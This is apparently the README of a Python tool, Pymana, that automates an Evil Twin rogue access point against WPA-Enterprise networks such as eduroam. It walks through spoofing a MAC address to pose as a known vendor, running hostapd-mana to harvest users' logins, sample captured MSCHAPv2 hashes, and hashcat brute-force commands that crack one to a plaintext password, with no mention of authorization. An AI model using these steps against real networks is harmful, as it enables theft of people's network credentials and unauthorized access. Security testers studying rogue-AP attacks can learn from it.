# Pymana

Pymana is a Python module developed to provide an automated way of initializing an Evil Twin attack to WPA-Enterprise networks using the hostapd-mana Linux package. Its features include Access Point (AP) initialization, hostapd-mana package execution, and device Media Access Control (MAC) address deny-listing.

To download this module and its hostapd-mana dependency, you can use ``git clone --recursive [repository link]``.

Pymana can be executed with ``sudo python pymana.py`` or ``sudo python3 pymana.py`` if python 3 is installed.

- Note: Before starting the Pymana script, it is recommended to ensure that the hostapd-mana package is effectively present and compiled in this module directory.

For the OS, it is recommended to use Kali Linux, a distribution that already contains a bunch of features for Wi-Fi analysis purposes.

## Command line arguments

Pymana can take command line arguments to set some custom run-time variables, for instance:

|Argument       |Description                    |Default |
|---------------|-------------------------------|--------|
|--iface        |`specifies the wireless adapter interface name`|wlan0 |
|--conf         |`specifies the name of the attack configuration file (".conf" sufix is automatically added)`|eduroam |
|--creds        |`sets the output credentials file name sufix ("credentials" prefix and ".json" sufix automatically added)`|***nothing*** |

- Note: Example arguments usage: ``sudo python pymana.py --iface wlan1 --conf custom --creds custom``, this will run pymana using the wireless interface ``wlan1``, with the configurations present in the file ``custom.conf`` and outputting captures to the file ``credentials-custom.json``.

## Authentication server certificates

The ``eduroam.conf`` file is configured to use the certificates present in the ``certs`` folder, ``server.key`` corresponds to the private key and ``server.pem`` to the public key, generated using openssl.

If for any reason you need your custom certificate (you can use the openssl or XCA packages for example), you can generate the keys, paste them in the ``certs`` folder (or another) and then modify the respective configuration file (``eduroam.conf``) lines (``server_cert`` and ``private_key``) to point to the new public and private keys.

# Installing drivers (ALFA adapters)

If the drivers needed for AP simulation are not installed, you can follow the steps below.

## Updating Your Kali Linux Distribution

```
sudo apt-get update
```

```
sudo apt-upgrade -y
```

```
sudo apt dist-upgrade -y
```

- Note: Reboot the system after these steps.

## Installing the Realtek-rtl88xxau Drivers

```
sudo apt-get install realtek-rtl88xxau-dkms
```

```
sudo apt-get install dkms
```

```
sudo apt-get install linux-headers-$(uname -r)
```

```
git clone https://github.com/aircrack-ng/rtl8812au.git
```

```
cd rtl8812au
```

```
make
```

```
sudo make install
```

- Note: Reboot the system after these steps.

# Remaining contents

The remainder of this file describes how to manually (without Pymana) set up a rogue AP simulating a WPA-Enterprise and how to analyze the obtained outputs.

# Installing package dependencies

```
sudo apt-get install hostapd-mana
```

```
sudo apt-get install macchanger
```

```
sudo apt-get install hashcat
```

- Note: You need to have an AP-capable device (support master mode) connected to your machine, otherwise hostapd won't be able to proceed with the AP creation. Refer to the links section for more comprehensive tutorials on how to setup ALFA devices.

# Initializing the fake AP

## Setting interface to unmanaged

Before starting the attack, it is recommended to set the wireless interface to unmanaged, otherwise some errors like ``handle_probe_req: send failed`` are prone to occur.

```
sudo nmcli dev set wlan0 managed no
```

- Note: Unmanaged mode needs to be set before changing the device MAC address otherwise, on the first run, it might not use the new address.

## Changing interface MAC address

Each wireless adapter has its default MAC address which uniquely identifies it. As this default MAC address often identifies the interface manufacturer (ex: CISCO, ALFA, PT, etc), it is recommended to change the default MAC address when setting up a rogue AP.

The ``macchanger`` package will be used as an example of how to change an interface's MAC address.

### Check current interface details

```
ifconfig wlan0
```

### Assign a random MAC address

```
(sudo ifconfig wlan0 down)

sudo macchanger -r wlan0

(sudo ifconfig wlan0 up)
```

### Assign a specific MAC address

```
(sudo ifconfig wlan0 down)

sudo macchanger --mac=XX:XX:XX:XX:XX:XX wlan0
[sudo macchanger --mac=00:0c:41:d7:b8:17 wlan0](00:0c:41:xx:xx:xx - CISCO LINKSY address)

(sudo ifconfig wlan0 up)
```

- Note: With the help of an Android phone device, a Wi-Fi analyzer application (``WiFiAnalyzer`` for example) can come in andy to quickly verify the available surrounding networks, their Service Set Identifiers (SSIDs), MAC addresses and corresponding manufacturers (when valid), and signal strength.

## Starting an attack

To start an attack, we just need to run the following command:

```
sudo hostapd-mana eduroam.conf
```

Or in case only lines containing relevant output are required:

```
sudo hostapd-mana eduroam.conf | grep -v wlan0
```

Optionally, the python script ``pymana.py`` can be used. It properly initializes the AP, starts an attack, and automatically adds devices to the deny list after the first disassociation (also reloading configurations for changes to take effect):

```
sudo python pymana.py
```

- Note: Make sure you have the ``eduroam.conf``, ``hostapd.eap_user``, ``hostapd.accept`` and ``hostapd.deny`` files.
Configurations and accept/deny lists can be reloaded with the command ``sudo kill -1 $(pidof [hostapd/hostapd-mana])`` without having to stop the attack.

# Analyzing results

Hostapd will most likely always retrieve the username of the device trying to connect. Whether or not it also finds the password depends on the EAP mechanismsm being used. In case it is EAP-TTLS with PAP, it will display the plain-text password. In case of EAP-PEAP with MSCHAPV2, we will need to do an extra hash cracking.

```
*sample output*

└─$ sudo hostapd-mana eduroam.conf
Configuration file: eduroam.conf
Using interface wlan0 with hwaddr 92:0e:cc:52:db:1a and ssid "eduroam"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED 
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: authenticated
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED e2:3a:88:4b:de:de
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: user@realm
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: user@realm
MANA EAP EAP-MSCHAPV2 ASLEAP user=user@realm | asleap -C 3c:c7:4f:bf:a5:a5:4f:10 -R 22:52:fb:36:fc:19:a7:02:ab:9f:39:68:3a:4b:4d:d2:a6:1e:9c:ee:a7:85:ed:e7
MANA EAP EAP-MSCHAPV2 JTR | user@realm:$NETNTLM$3cc74fbfa5a54f10$2252fb36fc19a702ab9f39683a4b4dd2a61e9ceea785ede7:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | user@realm::::2252fb36fc19a702ab9f39683a4b4dd2a61e9ceea785ede7:3cc74fbfa5a54f10
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 20 5f cb fe 32 3c 18 ac 31 7a 95 12 c6 19 da f4
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: disassociated
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: authenticated
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED e2:3a:88:4b:de:de
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: user@realm
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: user@realm
MANA EAP EAP-MSCHAPV2 ASLEAP user=user@realm | asleap -C 2e:59:a9:74:b3:37:3e:e8 -R 13:4d:db:1b:af:c8:18:25:51:1a:9d:55:a6:22:90:ef:ad:53:b2:36:bd:5b:7d:33
MANA EAP EAP-MSCHAPV2 JTR | user@realm:$NETNTLM$2e59a974b3373ee8$134ddb1bafc81825511a9d55a62290efad53b236bd5b7d33:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | user@realm::::134ddb1bafc81825511a9d55a62290efad53b236bd5b7d33:2e59a974b3373ee8
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): d8 37 3c 73 e0 71 23 65 a7 34 0d 9d d2 44 0b ee
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: disassociated
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: authenticated
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED e2:3a:88:4b:de:de
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: user@realm
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: user@realm
MANA EAP EAP-MSCHAPV2 ASLEAP user=user@realm | asleap -C 1d:a6:39:8b:1b:6f:c9:fa -R 72:9c:f2:86:45:36:2f:2b:a8:0d:d6:c0:f5:78:e4:96:c0:a2:c2:0d:90:50:5d:60
MANA EAP EAP-MSCHAPV2 JTR | user@realm:$NETNTLM$1da6398b1b6fc9fa$729cf28645362f2ba80dd6c0f578e496c0a2c20d90505d60:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | user@realm::::729cf28645362f2ba80dd6c0f578e496c0a2c20d90505d60:1da6398b1b6fc9fa
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): f1 4a 32 99 fd b8 b9 45 fa 16 28 e3 9a 28 92 10
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: disassociated
wlan0: STA e2:3a:88:4b:de:de IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)
^Cwlan0: interface state ENABLED->DISABLED
wlan0: AP-DISABLED 
nl80211: deinit ifname=wlan0 disabled_11b_rates=0
```

From the above example, we can focus on the lines refering to ``MANA EAP EAP-MSCHAPV2`` [``ASLEAP JTR HASHCAT``].

```
MANA EAP EAP-MSCHAPV2 ASLEAP user=user@realm | asleap -C 3c:c7:4f:bf:a5:a5:4f:10 -R 22:52:fb:36:fc:19:a7:02:ab:9f:39:68:3a:4b:4d:d2:a6:1e:9c:ee:a7:85:ed:e7
MANA EAP EAP-MSCHAPV2 JTR | user@realm:$NETNTLM$3cc74fbfa5a54f10$2252fb36fc19a702ab9f39683a4b4dd2a61e9ceea785ede7:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | user@realm::::2252fb36fc19a702ab9f39683a4b4dd2a61e9ceea785ede7:3cc74fbfa5a54f10
```

Seeing that the used EAP authentication methods on this example network are PEAP with MSCHAPV2, the passwords are not immediately retrieved, but captured in hash format. To try and probe them, tools like asleap, John the Ripper and hashcat can be used.

## Hashcat

This section exemplifies how to use hashcat to retrieve the captured hashed password.

By looking at the output ``MANA EAP EAP-MSCHAPV2 HASHCAT | user@realm::::2252fb36fc19a702ab9f39683a4b4dd2a61e9ceea785ede7:3cc74fbfa5a54f10``, we just need to grab the hash ``user@realm::::2252fb36fc19a702ab9f39683a4b4dd2a61e9ceea785ede7:3cc74fbfa5a54f10`` and past it on a file (``"hashcat-pw.txt"`` for example).

Now, we just need to execute the following command:

```
hashcat -m 5500 -a3 hashcat-pw.txt
```

Or if you want to try to optimize the search:

```
hashcat -m 5500 -a3 hashcat-pw.txt -1 "?l?u?d" "?1?1?1?1?1?1?1?1?1?1?1?1" --increment
```

|Argument           |Description                    |
|-------------------|-------------------------------|
|-m                 |`eap authentication method used (5500 corresponds to MSCHAPV2)`|
|-a3                |`bruteforce`                   |
|-1                 |`sets the mask`                |
|--increment        |`increments by each character to the extent of the mask`|

- Note: Hashcat mask attack documentation can be found in the reference links.

After some processing, hashcat will show the following output:

```
user@realm::::134ddb1bafc81825511a9d55a62290efad53b236bd5b7d33:2e59a974b3373ee8:pass321
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
Hash.Target......: user@realm::::134ddb1bafc81825511a9d55a62290efad53b...373ee8
Time.Started.....: Fri Dec  8 10:54:06 2023 (39 secs)
Time.Estimated...: Fri Dec  8 10:54:45 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?1?2?2?2?2?2?2 [7]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined 
Guess.Queue......: 7/15 (46.67%)
Speed.#1.........:   200.5 MH/s (4.98ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7826079744/134960504832 (5.80%)
Rejected.........: 0/7826079744 (0.00%)
Restore.Point....: 97280/1679616 (5.79%)
Restore.Sub.#1...: Salt:0 Amplifier:8192-9216 Iteration:0-1024
Candidate.Engine.: Device Generator
Candidates.#1....: lniorou -> Lurb710
Hardware.Mon.#1..: Util: 80%
```

From this output, in addition to the already known username ``user@realm``, hashcat found the password ``pass321``.

# Reference links

> [hostapd-mana package](https://github.com/sensepost/hostapd-mana.git)

> [Setup ALFA wi-fi adapter](https://hackernoon.com/configuring-the-alpha-awus036ach-wi-fi-adapter-on-kali-linux)

> [WPA-Enterprise hacking (includes ways to get victims information)](https://medium.com/@navkang/hacking-wpa-enterprise-using-hostapd-b0fa8839943d)

> [Hashcat mask attack documentation](https://hashcat.net/wiki/doku.php?id=mask_attack)

> [Hashcat restore session documentation](https://hashcat.net/wiki/doku.php?id=restore)
